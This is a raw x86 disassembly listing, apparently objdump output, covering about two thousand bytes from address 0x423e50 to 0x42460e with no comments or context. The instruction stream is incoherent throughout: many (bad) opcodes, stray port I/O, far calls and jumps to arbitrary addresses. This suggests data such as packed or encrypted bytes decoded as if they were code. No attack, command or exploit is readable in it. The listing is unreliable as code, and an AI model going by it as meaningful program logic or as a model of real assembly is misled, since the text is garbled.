  423e50:	xlat   BYTE PTR ds:[ebx]
  423e51:	(bad)  
  423e52:	and    ebx,edi
  423e54:	xor    DWORD PTR [eax+0x761c1d2f],ebp
  423e5a:	inc    ecx
  423e5b:	in     eax,dx
  423e5c:	outs   dx,DWORD PTR ds:[esi]
  423e5d:	jo     0x423e4f
  423e5f:	sbb    bh,dh
  423e61:	dec    ecx
  423e62:	add    al,0x74
  423e64:	retf   0x121a
  423e67:	xchg   ebp,eax
  423e68:	out    0xe5,al
  423e6a:	(bad)  
  423e6b:	rcr    DWORD PTR [edx+0x10],cl
  423e6e:	leave  
  423e6f:	and    eax,0x458e0d9d
  423e74:	mov    ?,WORD PTR [eax+0x39]
  423e77:	arpl   WORD PTR [edx+0x1cefd957],bp
  423e7d:	cwde   
  423e7e:	xor    BYTE PTR [edx],ah
  423e80:	sahf   
  423e81:	jg     0x423ebe
  423e83:	xor    al,0xe
  423e85:	lea    edi,[eax+0x9]
  423e88:	dec    edx
  423e89:	cs aas 
  423e8b:	sahf   
  423e8c:	leave  
  423e8d:	pop    esp
  423e8e:	and    al,0x85
  423e90:	cmp    ebp,edi
  423e92:	jl     0x423e49
  423e94:	int3   
  423e95:	das    
  423e96:	in     eax,dx
  423e97:	sbb    esp,DWORD PTR [edi]
  423e99:	dec    ecx
  423e9a:	std    
  423e9b:	jno    0x423e91
  423e9d:	adc    al,BYTE PTR [ebx]
  423e9f:	xchg   BYTE PTR ds:0x407e0e31,bl
  423ea5:	and    DWORD PTR [edx-0x72e29cfb],ecx
  423eab:	jb     0x423e87
  423ead:	cmp    al,0x52
  423eaf:	lods   eax,DWORD PTR ds:[esi]
  423eb0:	std    
  423eb1:	push   esi
  423eb2:	cmp    al,0xf3
  423eb4:	sahf   
  423eb5:	sub    dh,BYTE PTR [edx+0x4e]
  423eb8:	mov    al,BYTE PTR [edx]
  423eba:	out    dx,al
  423ebb:	mov    al,ds:0x2c7f9059
  423ec0:	call   0x8e6acd80
  423ec5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ec6:	push   eax
  423ec7:	or     DWORD PTR [ebx-0x31],ebx
  423eca:	dec    edx
  423ecb:	xchg   DWORD PTR [esi+0xd6c5630],ebp
  423ed1:	lds    ecx,FWORD PTR [esi-0x57]
  423ed4:	scas   al,BYTE PTR es:[edi]
  423ed5:	dec    esp
  423ed6:	cmp    DWORD PTR [edi+0x6627c298],0xfffffffe
  423edd:	jns    0x423e89
  423edf:	mov    ch,0x7f
  423ee1:	stos   BYTE PTR es:[edi],al
  423ee2:	out    dx,eax
  423ee3:	sbb    al,0x62
  423ee5:	add    BYTE PTR [eax+0x7c32393d],bl
  423eeb:	add    DWORD PTR [eax-0x34abb312],esi
  423ef1:	les    esi,FWORD PTR [edx-0x3f20174a]
  423ef7:	fisubr WORD PTR [ebx-0x73]
  423efa:	call   0xe4eef524
  423eff:	icebp  
  423f00:	popa   
  423f01:	xchg   esp,eax
  423f02:	dec    esi
  423f03:	cdq    
  423f04:	push   esp
  423f05:	std    
  423f06:	pop    esp
  423f07:	and    BYTE PTR [eax],al
  423f09:	cdq    
  423f0a:	jecxz  0x423eb2
  423f0c:	add    edi,DWORD PTR [edi]
  423f0e:	inc    esp
  423f0f:	jl     0x423f17
  423f11:	pop    ss
  423f12:	es pop esi
  423f14:	cli    
  423f15:	lahf   
  423f16:	(bad)  
  423f17:	(bad)  
  423f18:	ret    0x195b
  423f1b:	cli    
  423f1c:	addr16 pop ss
  423f1e:	jle    0x423f27
  423f20:	dec    edx
  423f21:	or     eax,0x428b604d
  423f26:	sbb    eax,0x7906a9e7
  423f2b:	mov    ebp,0xfe81881b
  423f30:	stos   DWORD PTR es:[edi],eax
  423f31:	sub    DWORD PTR [ecx-0x2],eax
  423f34:	add    BYTE PTR [edx+0x14],bl
  423f37:	mov    ch,0x42
  423f39:	ret    0x3ddf
  423f3c:	stos   BYTE PTR es:[edi],al
  423f3d:	ss ins DWORD PTR es:[edi],dx
  423f3f:	sub    al,0xc0
  423f41:	out    dx,al
  423f42:	cmp    al,0xb
  423f44:	adc    DWORD PTR [edx+ebp*1+0x30],0x54
  423f49:	ja     0x423ee3
  423f4b:	lods   al,BYTE PTR ds:[esi]
  423f4c:	retf   
  423f4d:	cli    
  423f4e:	jg     0x423ee6
  423f50:	(bad)  
  423f51:	xor    DWORD PTR [eax],eax
  423f53:	pop    ebp
  423f54:	(bad)
  423f58:	adc    dl,BYTE PTR [ecx+eiz*4]
  423f5b:	pushf  
  423f5c:	xchg   ebp,eax
  423f5d:	mov    ebx,0xe8f31ceb
  423f62:	jae    0x423f57
  423f64:	or     BYTE PTR [ebx-0x497b9aee],0x90
  423f6b:	loopne 0x423fd9
  423f6d:	jecxz  0x423ef0
  423f6f:	scas   eax,DWORD PTR es:[edi]
  423f70:	xchg   ebp,eax
  423f71:	dec    eax
  423f72:	fild   DWORD PTR ds:0x5ccc202b
  423f78:	sub    ebx,edi
  423f7a:	mov    es,WORD PTR [esi-0x63]
  423f7d:	(bad)  
  423f7e:	mov    ah,0x78
  423f80:	push   ecx
  423f81:	aaa    
  423f82:	mov    bh,0x99
  423f84:	xchg   edx,eax
  423f85:	icebp  
  423f86:	xor    dl,BYTE PTR [edi-0x6132030a]
  423f8c:	addr16 call 0xc2409f2
  423f92:	les    esp,FWORD PTR [ecx-0x22a42c74]
  423f98:	cld    
  423f99:	bound  esp,QWORD PTR [ebp+0x322a7176]
  423f9f:	fwait
  423fa0:	or     al,0xf0
  423fa2:	adc    BYTE PTR [esp+eax*8],0xb2
  423fa6:	fsubr  QWORD PTR [ebx]
  423fa8:	push   esi
  423fa9:	ins    DWORD PTR es:[edi],dx
  423faa:	push   eax
  423fab:	push   ds
  423fac:	mov    WORD PTR [ebx+0x3907909a],fs
  423fb2:	push   ss
  423fb3:	dec    ecx
  423fb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423fb5:	sti    
  423fb6:	push   cs
  423fb7:	in     eax,dx
  423fb8:	or     al,0x22
  423fba:	pusha  
  423fbb:	xor    DWORD PTR [ebp+0x28127a37],0x15843c20
  423fc5:	mov    ch,0xb0
  423fc7:	mov    WORD PTR [edi+0x1206a852],gs
  423fcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423fce:	popa   
  423fcf:	call   FWORD PTR [esi+0x69b58844]
  423fd5:	adc    eax,DWORD PTR [edi+0x49348809]
  423fdb:	push   0x55b2b458
  423fe0:	or     DWORD PTR [ebx-0x49b9e3c5],esp
  423fe6:	stos   BYTE PTR es:[edi],al
  423fe7:	fiadd  WORD PTR [ebx+edx*2-0x22]
  423feb:	bound  edx,QWORD PTR [edi]
  423fed:	das    
  423fee:	adc    ebx,ecx
  423ff0:	imul   edi,DWORD PTR [ebx+0x639b2773],0x26685bda
  423ffa:	cdq    
  423ffb:	or     eax,0x2966c568
  424000:	ds call 0xb826f27c
  424006:	aad    0x5d
  424008:	mov    ?,WORD PTR [esi+0x4dc5b643]
  42400e:	in     al,dx
  42400f:	dec    ecx
  424010:	pop    ss
  424011:	test   al,0xd4
  424013:	(bad)  
  424014:	cmp    ebx,DWORD PTR [esi+0x73]
  424017:	xor    bh,BYTE PTR [ebx-0x1571b8b2]
  42401d:	es es ds cs jge 0x423fc9
  424023:	daa    
  424024:	shl    BYTE PTR [edx+0x6],1
  424027:	or     ecx,DWORD PTR [edi-0x1e63de96]
  42402d:	ret    
  42402e:	sbb    edx,0xffffffb4
  424031:	sub    eax,0x40f02bbc
  424036:	sahf   
  424037:	pop    eax
  424038:	test   DWORD PTR [edx-0x42],esp
  42403b:	mov    eax,0x19d7631b
  424040:	test   eax,0x95607ed0
  424045:	lock jg 0x42404d
  424048:	mov    ebx,0x6365460d
  42404d:	and    eax,0x8bdab87d
  424052:	mov    cl,0xee
  424054:	mov    bl,0x62
  424056:	and    al,0x4
  424058:	ja     0x424004
  42405a:	int3   
  42405b:	push   0x96cf06fa
  424060:	adc    eax,0xc230dd1a
  424065:	test   BYTE PTR [eax],dl
  424067:	sub    ch,BYTE PTR [edx+0x13]
  42406a:	arpl   WORD PTR [ebx-0x46978dd0],si
  424070:	push   ecx
  424071:	jecxz  0x4240e9
  424073:	in     eax,dx
  424074:	mov    DWORD PTR [ebx-0x25],ebx
  424077:	mov    cl,0x1a
  424079:	imul   ebx,DWORD PTR [ecx+0x28],0x4003cb26
  424080:	fwait
  424081:	jo     0x424054
  424083:	push   ebp
  424084:	retf   0x5afe
  424087:	cld    
  424088:	ins    DWORD PTR es:[edi],dx
  424089:	les    esp,FWORD PTR [ecx]
  42408b:	mov    al,0xc5
  42408d:	ja     0x4240f5
  42408f:	scas   eax,DWORD PTR es:[edi]
  424090:	mov    eax,ds:0x2b0428de
  424095:	or     eax,edx
  424097:	aam    0xc7
  424099:	mov    ecx,0x96832e6a
  42409e:	mov    ch,0x0
  4240a0:	icebp  
  4240a1:	retf   
  4240a2:	aaa    
  4240a3:	fst    st(2)
  4240a5:	cmp    DWORD PTR [ebx],ecx
  4240a7:	shl    BYTE PTR [ecx+eiz*8-0x48],0xda
  4240ac:	mov    ss,WORD PTR [ebp-0x58]
  4240af:	pop    edi
  4240b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4240b1:	sbb    BYTE PTR [ebx-0x14be87cb],ch
  4240b7:	inc    ecx
  4240b8:	ss push edi
  4240ba:	xor    al,0xf2
  4240bc:	stc    
  4240bd:	sbb    ch,ah
  4240bf:	outs   dx,DWORD PTR ds:[esi]
  4240c0:	inc    ebp
  4240c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240c2:	push   0x54
  4240c4:	out    dx,al
  4240c5:	mov    ebx,0x4aaee7bf
  4240ca:	add    DWORD PTR [esp+ebx*2+0x6e],esp
  4240ce:	cmp    al,0x49
  4240d0:	sbb    bh,cl
  4240d2:	xchg   ebx,eax
  4240d3:	sub    eax,0x3d91a7ec
  4240d8:	mov    al,ds:0xe0e6dc54
  4240dd:	sti    
  4240de:	sub    dh,BYTE PTR [edi-0x3f8421c2]
  4240e4:	call   0x39fd4fe8
  4240e9:	xor    esi,eax
  4240eb:	imul   eax,edx,0xd3c25c72
  4240f1:	fadd   DWORD PTR [ebp+0x3b]
  4240f4:	pop    eax
  4240f5:	xchg   ebp,eax
  4240f6:	push   0xffffffd4
  4240f8:	xchg   edi,eax
  4240f9:	cmp    bl,ah
  4240fb:	inc    ebp
  4240fc:	push   ebp
  4240fd:	dec    esp
  4240fe:	push   0x1b95c96b
  424103:	or     DWORD PTR [esi],edi
  424105:	out    0x6f,eax
  424107:	cld    
  424108:	pop    esi
  424109:	mov    ds:0x3614b5fd,al
  42410e:	mov    edi,0xb25fc387
  424113:	ret    0x362c
  424116:	ret    
  424117:	add    dh,BYTE PTR [edx]
  424119:	and    DWORD PTR [ebx],edx
  42411b:	push   esp
  42411c:	push   edi
  42411d:	popa   
  42411e:	adc    BYTE PTR [ecx+ebx*1],ch
  424121:	daa    
  424122:	adc    eax,eax
  424124:	adc    DWORD PTR [esi],edx
  424126:	cmp    ebp,esi
  424128:	xor    BYTE PTR [esi-0x6e],bl
  42412b:	nop
  42412c:	pop    es
  42412d:	cli    
  42412e:	sub    DWORD PTR [esi-0x318885e2],ebx
  424134:	lods   al,BYTE PTR ds:[esi]
  424135:	jo     0x424117
  424137:	dec    edx
  424138:	pop    esp
  424139:	out    dx,al
  42413a:	xchg   esi,eax
  42413b:	mov    eax,0x3f0ae47d
  424140:	rol    esi,cl
  424142:	gs push edx
  424144:	jmp    0xfcd68d1c
  424149:	sti    
  42414a:	jb     0x4240cf
  42414c:	enter  0x6659,0x48
  424150:	(bad)  
  424151:	sub    ecx,DWORD PTR [edi-0x7415cf8c]
  424157:	mov    esp,0x1b390a70
  42415c:	mov    ebp,0xc2a66546
  424161:	addr16 leave 
  424163:	xchg   edx,eax
  424164:	push   eax
  424165:	mov    WORD PTR [ecx+eiz*1],es
  424168:	out    0x59,eax
  42416a:	push   cs
  42416b:	and    eax,0xd48f0f0e
  424170:	dec    edx
  424171:	inc    ecx
  424172:	das    
  424173:	jmp    0xafd4f4e2
  424178:	push   ecx
  424179:	in     eax,dx
  42417a:	scas   al,BYTE PTR es:[edi]
  42417b:	imul   edx,DWORD PTR ds:0xf4676087,0x85513506
  424185:	jmp    0x424123
  424187:	ror    BYTE PTR [edi+0x29],1
  42418a:	push   0x49
  42418c:	jecxz  0x42420d
  42418e:	dec    ebx
  42418f:	sbb    BYTE PTR [ecx+0x2],dl
  424192:	clc    
  424193:	scas   al,BYTE PTR es:[edi]
  424194:	imul   eax,DWORD PTR [ebx-0x69],0xedcea093
  42419b:	int3   
  42419c:	aam    0x43
  42419e:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4241a0:	aas    
  4241a1:	or     DWORD PTR [ecx+0x4b],esp
  4241a4:	xor    DWORD PTR [eax-0x1aac460b],0x896cf4e8
  4241ae:	(bad)  
  4241af:	ror    BYTE PTR [edx],cl
  4241b1:	sub    DWORD PTR [edi+eax*1],ebx
  4241b4:	or     DWORD PTR [ecx-0x34],edx
  4241b7:	inc    ecx
  4241b8:	jo     0x42419e
  4241ba:	fwait
  4241bb:	int    0xd0
  4241bd:	push   ds
  4241be:	pop    eax
  4241bf:	sub    esi,DWORD PTR [eax-0x29e15d6b]
  4241c5:	inc    edi
  4241c6:	add    al,0xaf
  4241c8:	sbb    bh,BYTE PTR [edi+0x35]
  4241cb:	and    eax,0x991f2fc3
  4241d0:	(bad)  
  4241d1:	fnstenv [eax+0x635b1d2b]
  4241d7:	sbb    al,0x17
  4241d9:	into   
  4241da:	fimul  WORD PTR [edx]
  4241dc:	mov    dl,0x5a
  4241de:	jle    0x42423d
  4241e0:	cmc    
  4241e1:	sbb    dh,BYTE PTR [eax+0xc6050c5]
  4241e7:	or     eax,0x9802d60e
  4241ec:	xor    BYTE PTR [esi-0x1cf745d9],0xf2
  4241f3:	mov    ah,0x2b
  4241f5:	sub    BYTE PTR [eax],al
  4241f7:	les    eax,FWORD PTR [ebx+0x70f2980a]
  4241fd:	push   ebp
  4241fe:	sahf   
  4241ff:	and    ch,bl
  424201:	lods   eax,DWORD PTR ds:[esi]
  424202:	les    ecx,FWORD PTR [ebx]
  424204:	fistp  WORD PTR [eax+0x5e]
  424207:	leave  
  424208:	xor    BYTE PTR [esi+0x1562113b],0x8c
  42420f:	fisub  DWORD PTR [edx+0x2b]
  424212:	pushf  
  424213:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424214:	or     BYTE PTR [ebp+0x7f],bh
  424217:	(bad)  
  424218:	sub    eax,0x6d14f166
  42421d:	pop    ebp
  42421e:	aad    0x1f
  424220:	or     ah,dl
  424222:	inc    edx
  424223:	sti    
  424224:	xor    BYTE PTR [edi],al
  424226:	push   edi
  424227:	dec    esp
  424228:	ins    BYTE PTR es:[edi],dx
  424229:	nop
  42422a:	inc    esp
  42422b:	push   ebx
  42422c:	mov    ebp,0xba534c85
  424231:	std    
  424232:	js     0x42425f
  424234:	enter  0x6447,0x55
  424238:	fcomp  QWORD PTR [esi+0x1e]
  42423b:	lahf   
  42423c:	jnp    0x42428d
  42423e:	dec    ecx
  42423f:	mov    edi,DWORD PTR cs:[edx]
  424242:	xor    al,0x9a
  424244:	and    al,0x63
  424246:	jae    0x424271
  424248:	or     BYTE PTR [edx],bh
  42424a:	jo     0x4241f2
  42424c:	sbb    al,0x21
  42424e:	and    ebp,DWORD PTR [ebx+ebp*2+0x2c]
  424252:	xchg   BYTE PTR [ebp-0x41],cl
  424255:	inc    ebp
  424256:	jmp    0xc5b6acde
  42425b:	mov    ?,WORD PTR [esi-0x41]
  42425e:	jmp    0x5237a3db
  424263:	pop    esp
  424264:	mov    bh,cl
  424266:	test   eax,0xf2df8170
  42426b:	mov    eax,0xfae77030
  424270:	xor    bh,BYTE PTR [edx]
  424272:	or     BYTE PTR [ebx-0x23d3ee02],al
  424278:	push   ebp
  424279:	mov    ebx,0x8c4a033b
  42427e:	mov    edi,0xa496f1fa
  424283:	jle    0x424303
  424285:	repnz hlt 
  424287:	aam    0xf7
  424289:	mov    al,ds:0x1459f076
  42428e:	inc    ebp
  42428f:	aas    
  424290:	cmp    eax,0xf2864a2b
  424295:	stos   DWORD PTR es:[edi],eax
  424296:	aaa    
  424297:	sub    dl,BYTE PTR [ebx+ebx*4-0x13]
  42429b:	push   edx
  42429c:	ds mov cl,0xc8
  42429f:	cwde   
  4242a0:	sub    esp,DWORD PTR [eax+edi*8]
  4242a3:	(bad)  
  4242a4:	mov    DWORD PTR es:[ebp+0x5cd87ae1],ebp
  4242ab:	jmp    0x424309
  4242ad:	fsubp  st(6),st
  4242af:	sbb    ch,BYTE PTR [ebp+0x67]
  4242b2:	outs   dx,DWORD PTR ds:[esi]
  4242b3:	or     DWORD PTR [ebx+edi*4-0x29305a1],ebp
  4242ba:	ffreep st(6)
  4242bc:	pop    eax
  4242bd:	inc    eax
  4242be:	shl    BYTE PTR [eax],0xeb
  4242c1:	dec    ebx
  4242c2:	sbb    bl,BYTE PTR [edx-0x37]
  4242c5:	mov    ds:0x95a1b5f3,eax
  4242ca:	inc    esp
  4242cb:	pop    esp
  4242cc:	call   0x2aecaded
  4242d1:	mov    ds:0xf8c407ff,al
  4242d6:	jmp    0xb6c42811
  4242db:	es cwde 
  4242dd:	dec    eax
  4242de:	dec    edx
  4242df:	aad    0x6e
  4242e1:	or     eax,0x3ef5b470
  4242e6:	int    0xf0
  4242e8:	addr16 mov ds:0x83ae,al
  4242ec:	icebp  
  4242ed:	mov    ebp,DWORD PTR [edi]
  4242ef:	jno    0x424361
  4242f1:	xchg   DWORD PTR [ebp-0xd46b56a],edi
  4242f7:	and    al,0x7e
  4242f9:	inc    edx
  4242fa:	xchg   ch,cl
  4242fc:	dec    esi
  4242fd:	pop    edx
  4242fe:	jg     0x424357
  424300:	into   
  424301:	jge    0x4242a8
  424303:	mov    ds,ebx
  424305:	mov    ebx,0x458514db
  42430a:	aaa    
  42430b:	in     eax,0x3b
  42430d:	lods   al,BYTE PTR ds:[esi]
  42430e:	xchg   esp,eax
  42430f:	lahf   
  424310:	(bad)  
  424312:	push   edx
  424313:	push   0x7feea172
  424318:	cmp    bl,BYTE PTR [ebx-0x2c]
  42431b:	mov    ch,0x31
  42431d:	mov    al,ds:0x9acd153
  424322:	repnz push eax
  424324:	adc    BYTE PTR [eax+0x2620c8c1],0xf1
  42432b:	cdq    
  42432c:	xlat   BYTE PTR ds:[ebx]
  42432d:	adc    BYTE PTR [ebx-0x5030a009],dl
  424333:	cmp    BYTE PTR [esi-0x55],al
  424336:	mov    ebx,0xb8df0340
  42433b:	sar    DWORD PTR [ebx-0x584940e6],0xa
  424342:	int    0xac
  424344:	xchg   edx,eax
  424345:	sub    DWORD PTR [edi-0x4fff652d],ecx
  42434b:	sub    DWORD PTR ds:0xfbc8b679,0xf0c7e41a
  424355:	mov    ebp,0xaeaa998c
  42435a:	out    dx,al
  42435b:	dec    ebx
  42435c:	pop    ds
  42435d:	imul   eax,DWORD PTR [esi-0x28127b1e],0xfffffff9
  424364:	mov    cl,0x2c
  424366:	jno    0x42435f
  424368:	loop   0x42434c
  42436a:	fbstp  TBYTE PTR [edi]
  42436c:	cmp    eax,0x1ac8fe2d
  424371:	sbb    esp,DWORD PTR [edi+ebp*8]
  424374:	pop    ds
  424375:	or     DWORD PTR [ebx-0x2],edx
  424378:	mov    ebp,0x56b5f209
  42437d:	lods   eax,DWORD PTR ds:[esi]
  42437e:	repnz scas eax,DWORD PTR es:[edi]
  424380:	addr16 adc ch,dl
  424383:	icebp  
  424384:	loop   0x42431c
  424386:	push   eax
  424387:	mov    edx,DWORD PTR [edi]
  424389:	push   ebx
  42438a:	fcmovnu st,st(4)
  42438c:	mov    edi,0xf81ad444
  424391:	or     esi,DWORD PTR [edi]
  424393:	pop    ebx
  424394:	stc    
  424395:	mov    eax,0xa2cbbbd3
  42439a:	xchg   DWORD PTR [ebx],edi
  42439c:	pop    ss
  42439d:	daa    
  42439e:	cmp    ch,BYTE PTR cs:[esi]
  4243a1:	jns    0x4243fb
  4243a3:	mov    bh,0x4
  4243a5:	int3   
  4243a6:	repnz mov BYTE PTR [edx+0x4b78b74],cl
  4243ad:	enter  0xe65b,0xe1
  4243b1:	push   0x2d17b3b
  4243b6:	popf   
  4243b7:	test   DWORD PTR [ebx+0x6e9a736e],ecx
  4243bd:	sbb    BYTE PTR [ebx-0x6c5fdca8],bl
  4243c3:	inc    eax
  4243c4:	and    al,0xd4
  4243c6:	dec    ecx
  4243c7:	das    
  4243c8:	add    BYTE PTR [eax],al
  4243ca:	pop    edx
  4243cb:	inc    esp
  4243cc:	dec    esi
  4243cd:	inc    ecx
  4243ce:	pop    esi
  4243cf:	dec    ebx
  4243d0:	pop    edi
  4243d1:	pop    edi
  4243d2:	inc    edx
  4243d3:	cwde   
  4243d4:	inc    esi
  4243d5:	loop   0x424395
  4243d7:	mov    dl,BYTE PTR [eax+0x1d21e4c]
  4243dd:	add    BYTE PTR [esi-0x13fffffa],al
  4243e3:	aad    0x38
  4243e5:	pop    edi
  4243e6:	aam    0xe2
  4243e8:	push   ebp
  4243e9:	push   ss
  4243ea:	aas    
  4243eb:	and    esp,DWORD PTR es:[ebp+0x59]
  4243ef:	int3   
  4243f0:	out    dx,eax
  4243f1:	adc    eax,0x49e99b2c
  4243f6:	shl    BYTE PTR ds:0xf18e,cl
  4243fb:	bound  edi,QWORD PTR [edi-0x27cc0d14]
  424401:	lahf   
  424402:	sbb    ecx,DWORD PTR [esi-0x76]
  424405:	aas    
  424406:	xor    dl,BYTE PTR [esi]
  424408:	push   es
  424409:	cld    
  42440a:	sub    al,BYTE PTR [ecx+edi*1+0x2e]
  42440e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42440f:	sbb    BYTE PTR gs:[eax+0x13561ba8],cl
  424416:	xchg   esp,eax
  424417:	push   bx
  424419:	jmp    DWORD PTR [ecx-0x3b]
  42441c:	outs   dx,DWORD PTR ds:[esi]
  42441d:	loope  0x42445b
  42441f:	fnstsw WORD PTR [edi+0x66b5d45f]
  424425:	jecxz  0x424494
  424427:	outs   dx,BYTE PTR ds:[esi]
  424428:	add    al,0x46
  42442a:	xchg   ebp,eax
  42442b:	pushf  
  42442c:	cdq    
  42442d:	int    0x21
  42442f:	inc    ecx
  424430:	pop    ss
  424431:	jp     0x4243ca
  424433:	call   0xf7dfb768
  424438:	add    ch,dh
  42443a:	add    ebp,eax
  42443c:	adc    ch,BYTE PTR [esi]
  42443e:	in     eax,dx
  42443f:	out    0x9a,al
  424441:	xor    eax,0xef341e4d
  424446:	jne    0x4243d2
  424448:	shl    DWORD PTR [ebp-0xc427eef],cl
  42444e:	mov    bh,0x7
  424450:	jmp    0x42449b
  424452:	retf   0xe5bb
  424455:	mov    WORD PTR [esi-0x10828116],cs
  42445b:	ja     0x4243f1
  42445d:	out    dx,al
  42445e:	jo     0x4243e7
  424460:	repnz in eax,0x17
  424463:	push   ecx
  424464:	ret    0x3b6
  424467:	push   DWORD PTR [ecx]
  424469:	fcomp  DWORD PTR [edx-0x59]
  42446c:	or     al,BYTE PTR [ecx+eiz*4+0x1c]
  424470:	push   ecx
  424471:	outs   dx,DWORD PTR ds:[esi]
  424472:	jp     0x4244ae
  424474:	repz imul DWORD PTR [esi]
  424477:	pop    ebx
  424478:	nop
  424479:	scas   eax,DWORD PTR es:[edi]
  42447a:	in     eax,0x31
  42447c:	xchg   BYTE PTR [edx],ah
  42447e:	inc    esp
  42447f:	or     al,BYTE PTR [esi+0x501ece0e]
  424485:	push   edi
  424486:	cs push esp
  424488:	xchg   ebx,eax
  424489:	(bad)  
  42448a:	ds mov ebp,0x6c1132c1
  424490:	cmp    eax,0x7afec73b
  424495:	sar    DWORD PTR [edx],cl
  424497:	xchg   ebp,eax
  424498:	xchg   ecx,eax
  424499:	aam    0xc9
  42449b:	xchg   DWORD PTR [ebp+0x34],eax
  42449e:	jecxz  0x4244d6
  4244a0:	fld    QWORD PTR [ecx]
  4244a2:	ins    BYTE PTR es:[edi],dx
  4244a3:	dec    esi
  4244a4:	loop   0x424523
  4244a6:	sbb    al,0xeb
  4244a8:	sbb    DWORD PTR [eax+0x7b],esi
  4244ab:	test   BYTE PTR [edi+0xa9e58f1],dh
  4244b1:	repnz and DWORD PTR [edi],0x719c7184
  4244b8:	lahf   
  4244b9:	add    dl,dh
  4244bb:	loopne 0x424515
  4244bd:	in     al,0x5
  4244bf:	pop    ds
  4244c0:	inc    eax
  4244c1:	or     ecx,esi
  4244c3:	or     esp,DWORD PTR [ebx+0x39f13122]
  4244c9:	push   0xa2c0a8bd
  4244ce:	dec    ebp
  4244cf:	sub    eax,0x82af38a8
  4244d4:	xchg   ecx,eax
  4244d5:	std    
  4244d6:	pop    es
  4244d7:	hlt    
  4244d8:	xchg   esp,eax
  4244d9:	push   ds
  4244da:	add    DWORD PTR es:[esi-0x64c91b60],0xffffff98
  4244e2:	mov    ecx,0x7913fe8a
  4244e7:	push   eax
  4244e8:	sub    eax,0xb500bfc7
  4244ed:	ins    DWORD PTR es:[edi],dx
  4244ee:	sar    bh,1
  4244f0:	add    ch,cl
  4244f2:	push   edx
  4244f3:	fdiv   QWORD PTR [ecx-0x21207b35]
  4244f9:	in     al,0x17
  4244fb:	cmp    eax,0x5af5a3e2
  424500:	cmp    DWORD PTR [edx-0x21c7c685],ecx
  424506:	jno    0x4244ac
  424508:	ds pop ebx
  42450a:	out    dx,al
  42450b:	add    eax,0x14e3a570
  424510:	scas   al,BYTE PTR es:[edi]
  424511:	rcr    cl,cl
  424513:	aas    
  424514:	aaa    
  424515:	add    dh,BYTE PTR [ebx-0xa71cfe0]
  42451b:	xor    bl,BYTE PTR [ecx+0x1e]
  42451e:	adc    BYTE PTR [eax+0x16c62bfe],ah
  424524:	cs sub eax,0x4fb1ff15
  42452a:	xor    edx,DWORD PTR [esi]
  42452c:	push   esp
  42452d:	aam    0x9
  42452f:	cmp    eax,0xd959cc32
  424534:	dec    eax
  424535:	push   edi
  424536:	mov    eax,0x3b50ee2f
  42453b:	and    ah,bl
  42453d:	aaa    
  42453e:	cmp    edx,DWORD PTR [eax-0x66]
  424541:	inc    ebx
  424542:	rcl    BYTE PTR [ecx+0xdcbec87],1
  424548:	shl    BYTE PTR [ebp-0x49],1
  42454b:	sbb    ecx,DWORD PTR [eax]
  42454d:	jge    0x424596
  42454f:	add    esi,ebp
  424551:	lahf   
  424552:	xor    cl,BYTE PTR [esi+0x7ec0db71]
  424558:	scas   eax,DWORD PTR es:[edi]
  424559:	xchg   ebx,eax
  42455a:	mov    al,0x8a
  42455c:	sbb    dh,dh
  42455e:	add    DWORD PTR [ecx+0x26e6b40a],edx
  424564:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424565:	xchg   esi,eax
  424566:	sub    al,0x3d
  424568:	pop    ss
  424569:	xchg   esp,eax
  42456a:	cmp    al,0x9c
  42456c:	add    eax,0x49dd44c5
  424571:	mov    eax,ds:0x63fe1410
  424576:	pop    es
  424577:	xlat   BYTE PTR ds:[ebx]
  424578:	mov    dh,0xe1
  42457a:	nop
  42457b:	and    BYTE PTR [ebp+0x5c],al
  42457e:	adc    BYTE PTR [ebp+0x2b],cl
  424581:	adc    BYTE PTR [ebx-0x19b5165c],bh
  424587:	(bad)  
  424588:	out    dx,eax
  424589:	push   cs
  42458a:	inc    ebp
  42458b:	out    dx,al
  42458c:	in     eax,dx
  42458d:	sub    DWORD PTR [eax],esi
  42458f:	ins    BYTE PTR es:[edi],dx
  424590:	je     0x4245e0
  424592:	inc    esi
  424593:	mov    ah,0xc6
  424595:	push   ds
  424596:	and    edi,DWORD PTR [eax-0x41]
  424599:	xor    eax,0xc903cfc4
  42459e:	mov    eax,0xbe644ce3
  4245a3:	xor    bl,BYTE PTR [ecx]
  4245a5:	outs   dx,BYTE PTR ds:[esi]
  4245a6:	sub    bl,BYTE PTR [esi]
  4245a8:	and    DWORD PTR [edi+0x1f],0xffffffe2
  4245ac:	rcr    DWORD PTR [esi+ebp*4-0xaa9a01b],0x50
  4245b4:	and    eax,0x3de3b94c
  4245b9:	and    ecx,DWORD PTR [edi-0x14cf2c29]
  4245bf:	aaa    
  4245c0:	retf   0xddcb
  4245c3:	push   ds
  4245c4:	xchg   DWORD PTR [ebx-0x50],esp
  4245c7:	mov    cl,0x6e
  4245c9:	out    0xa3,al
  4245cb:	inc    edx
  4245cc:	and    DWORD PTR [eax-0x2e],ebx
  4245cf:	dec    eax
  4245d0:	ss sub BYTE PTR fs:[eax-0x79],bh
  4245d5:	into   
  4245d6:	and    eax,0xd957e52d
  4245db:	xchg   ebx,eax
  4245dc:	stc    
  4245dd:	dec    ebx
  4245de:	cmp    BYTE PTR [ebx],0xe3
  4245e1:	repz push ebx
  4245e3:	jae    0x424617
  4245e5:	xchg   ecx,eax
  4245e6:	fld    TBYTE PTR [edx+0x4e]
  4245e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245ea:	pop    eax
  4245eb:	and    DWORD PTR [eax],ebp
  4245ed:	in     eax,0xef
  4245ef:	xchg   edx,eax
  4245f0:	popa   
  4245f1:	out    0x48,eax
  4245f3:	dec    ebx
  4245f4:	repnz adc cl,BYTE PTR [ebx]
  4245f7:	push   cs
  4245f8:	es test eax,0xf0117714
  4245fe:	adc    eax,eax
  424600:	pop    ds
  424601:	push   esi
  424602:	rcl    al,1
  424604:	lods   eax,DWORD PTR ds:[esi]
  424605:	repnz out 0x7b,eax
  424608:	enter  0x54ee,0xd1
  42460c:	jmp    0x42462e
  42460e:	dec    esp
